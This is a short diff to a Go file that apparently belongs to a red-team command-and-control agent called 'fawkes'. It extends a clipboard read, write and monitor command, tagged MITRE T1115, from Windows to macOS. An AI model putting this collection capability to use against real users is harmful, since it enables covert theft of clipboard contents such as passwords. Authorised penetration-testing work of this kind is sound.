@@ -7,7 +7,7 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "clipboard",
-		Description:         "Read, write, or continuously monitor the Windows clipboard contents (text only)",
+		Description:         "Read, write, or continuously monitor clipboard contents (text only). Windows uses native API, macOS uses pbpaste/pbcopy.",
 		HelpString:          "clipboard -action read\nclipboard -action write -data \"text\"\nclipboard -action monitor [-interval 3]\nclipboard -action dump\nclipboard -action stop",
 		Version:             2,
 		SupportedUIFeatures: []string{},
@@ -15,7 +15,7 @@ func init() {
 		MitreAttackMappings: []string{"T1115"}, // Clipboard Data
 		ScriptOnlyCommand:   false,
 		CommandAttributes: agentstructs.CommandAttribute{
-			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
+			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_MACOS},
 		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
